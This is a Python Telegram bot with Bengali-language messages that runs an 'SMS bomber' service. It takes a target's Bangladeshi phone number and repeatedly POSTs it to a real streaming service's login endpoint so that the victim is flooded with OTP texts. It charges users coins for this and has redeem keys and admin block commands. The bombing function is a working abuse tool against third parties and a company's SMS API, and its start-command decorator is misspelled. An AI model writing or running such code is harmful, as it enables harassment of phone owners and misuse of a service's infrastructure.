import telebot
import requests
import json
import time
import os
from telebot import types
from datetime import datetime

# --- CONFIGURATION ---
API_TOKEN = 'YOUR_BOT_TOKEN' # এখানে তোমার বট টোকেন দাও
ADMIN_ID = 123456789 # তোমার টেলিগ্রাম আইডি দাও
LOG_CHANNEL = "@sMsBotManagerDUModz" # লগ চ্যানেল
CHECK_CHANNEL = "@DemoTestDUModz" # জয়েন ভেরিফাই চ্যানেল
CHANNEL_LINK = "https://t.me/DemoTestDUModz"
WEBSITE_LINK = "https://darkunkwonmodz.blogspot.com"
LOGO_URL = "https://raw.githubusercontent.com/DarkUnkwonModZ/Blogger-DarkUnkownModZ-Appinfo/refs/heads/main/IMG/dumodz-logo-final.png"

bot = telebot.TeleBot(API_TOKEN)
DB_FILE = 'database.json'

# --- DATABASE FUNCTIONS ---
def load_db():
    if not os.path.exists(DB_FILE):
        data = {"users": {}, "keys": {}}
        with open(DB_FILE, 'w') as f:
            json.dump(data, f)
    with open(DB_FILE, 'r') as f:
        return json.load(f)

def save_db(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=4)

def register_user(user_id, username):
    db = load_db()
    user_id = str(user_id)
    if user_id not in db["users"]:
        db["users"][user_id] = {
            "username": username,
            "coins": 30,
            "status": "active",
            "joined_at": str(datetime.now())
        }
        save_db(db)
        # Send update to log channel
        log_text = f"🆕 New User Joined!\n👤 Name: {username}\n🆔 ID: {user_id}"
        try: bot.send_message(LOG_CHANNEL, log_text)
        except: pass
        return True
    return False

# --- MIDDLEWARE: CHECK JOIN ---
def is_joined(user_id):
    try:
        member = bot.get_chat_member(CHECK_CHANNEL, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# --- KEYBOARD HELPERS ---
def main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("🚀 Start SMS", callback_data="start_sms")
    btn2 = types.InlineKeyboardButton("💰 My Profile", callback_data="profile")
    btn3 = types.InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem")
    btn4 = types.InlineKeyboardButton("🌐 Website", url=WEBSITE_LINK)
    btn5 = types.InlineKeyboardButton("📢 Channel", url=CHANNEL_LINK)
    markup.add(btn1, btn2, btn3, btn4, btn5)
    return markup

# --- COMMANDS ---
@bot.message_message_handler(commands=['start'])
def start(message):
    user_id = str(message.from_user.id)
    register_user(user_id, message.from_user.first_name)
    
    if not is_joined(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Join Channel", url=CHANNEL_LINK))
        markup.add(types.InlineKeyboardButton("✅ Verify Join", callback_data="verify"))
        bot.send_message(message.chat.id, "⚠️ আপনাকে আগে আমাদের চ্যানেলে জয়েন করতে হবে!", reply_markup=markup)
        return

    send_welcome(message.chat.id)

def send_welcome(chat_id):
    msg = bot.send_message(chat_id, "🔍 Verifying Security...")
    time.sleep(1)
    bot.edit_message_text("⚙️ Optimizing System...", chat_id, msg.message_id)
    time.sleep(1)
    bot.edit_message_text("✅ Verification Complete!", chat_id, msg.message_id)
    
    welcome_text = (
        f"🌟 **Welcome to Dark Unkwon ModZ** 🌟\n\n"
        f"বটটি ব্যবহার করে আপনি আনলিমিটেড SMS সেন্ড করতে পারবেন।\n"
        f"প্রতি SMS রিকোয়েস্টে ৫ কয়েন চার্জ করা হবে।"
    )
    bot.send_photo(chat_id, LOGO_URL, caption=welcome_text, reply_markup=main_menu(), parse_mode="Markdown")

# --- CALLBACK HANDLERS ---
@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    db = load_db()
    uid = str(call.from_user.id)
    
    if call.data == "verify":
        if is_joined(call.from_user.id):
            bot.answer_callback_query(call.id, "✅ Success!")
            send_welcome(call.message.chat.id)
        else:
            bot.answer_callback_query(call.id, "❌ আপনি এখনো জয়েন করেননি!", show_alert=True)

    elif call.data == "profile":
        user = db["users"].get(uid)
        text = (f"👤 **User Info**\n"
                f"━━━━━━━━━━━━━━\n"
                f"🆔 ID: `{uid}`\n"
                f"💰 Coins: {user['coins']}\n"
                f"🎖 Status: {user['status'].upper()}\n"
                f"━━━━━━━━━━━━━━")
        bot.send_message(call.message.chat.id, text, parse_mode="Markdown")

    elif call.data == "start_sms":
        if db["users"][uid]["status"] == "blocked":
            bot.answer_callback_query(call.id, "🚫 You are BLOCKED!", show_alert=True)
            return
        msg = bot.send_message(call.message.chat.id, "📱 Enter Target Number (Without +88):")
        bot.register_next_step_handler(msg, get_number)

    elif call.data == "redeem":
        msg = bot.send_message(call.message.chat.id, "🔑 Enter Your Recharge Key:")
        bot.register_next_step_handler(msg, process_redeem)

# --- SMS LOGIC ---
def get_number(message):
    number = message.text
    if len(number) != 11:
        bot.send_message(message.chat.id, "❌ Invalid Number!")
        return
    msg = bot.send_message(message.chat.id, "🔢 Enter Amount (Max 50):")
    bot.register_next_step_handler(msg, lambda m: start_bombing(m, number))

def start_bombing(message, number):
    try:
        amount = int(message.text)
    except:
        bot.send_message(message.chat.id, "❌ Invalid Amount!")
        return

    db = load_db()
    uid = str(message.from_user.id)
    user_data = db["users"][uid]
    
    # Check Status & Coins
    total_cost = amount * 5
    if user_data["status"] != "lifetime":
        if user_data["coins"] < total_cost:
            bot.send_message(message.chat.id, f"❌ পর্যাপ্ত কয়েন নেই! প্রয়োজন {total_cost} কয়েন।")
            return
        user_data["coins"] -= total_cost
        save_db(db)

    # SMS Sending Simulation/Process
    status_msg = bot.send_message(message.chat.id, "🚀 Bombing Started...")
    
    url = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36",
        'Content-Type': "application/json",
        'referer': "https://www.bioscopeplus.com/"
    }
    payload = {"number": "+88" + number}

    success = 0
    for i in range(amount):
        try:
            res = requests.post(url, json=payload, headers=headers)
            if res.status_code == 200:
                success += 1
            bot.edit_message_text(f"🚀 Progress: {i+1}/{amount}\n✅ Success: {success}", message.chat.id, status_msg.message_id)
            time.sleep(1) # Rate limit protection
        except:
            pass

    bot.send_message(message.chat.id, f"✅ Done! {success} SMS Sent successfully.")

def process_redeem(message):
    key = message.text
    db = load_db()
    if key in db["keys"] and not db["keys"][key]["used"]:
        bonus = db["keys"][key]["value"]
        db["users"][str(message.from_user.id)]["coins"] += bonus
        db["keys"][key]["used"] = True
        save_db(db)
        bot.send_message(message.chat.id, f"✅ Success! {bonus} Coins added.")
    else:
        bot.send_message(message.chat.id, "❌ Invalid or Used Key!")

# --- ADMIN COMMANDS ---
@bot.message_handler(commands=['addkey'])
def add_key(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        _, key, val = message.text.split()
        db = load_db()
        db["keys"][key] = {"value": int(val), "used": False}
        save_db(db)
        bot.reply_to(message, f"🔑 Key Created: `{key}` Val: {val}")
    except:
        bot.reply_to(message, "Usage: /addkey KEY_NAME AMOUNT")

@bot.message_handler(commands=['block'])
def block_user(message):
    if message.from_user.id != ADMIN_ID: return
    uid = message.text.split()[1]
    db = load_db()
    if uid in db["users"]:
        db["users"][uid]["status"] = "blocked"
        save_db(db)
        bot.reply_to(message, "🚫 User Blocked.")

@bot.message_handler(commands=['lifetime'])
def set_lifetime(message):
    if message.from_user.id != ADMIN_ID: return
    uid = message.text.split()[1]
    db = load_db()
    if uid in db["users"]:
        db["users"][uid]["status"] = "lifetime"
        save_db(db)
        bot.reply_to(message, "💎 User upgraded to Lifetime.")

bot.infinity_polling()
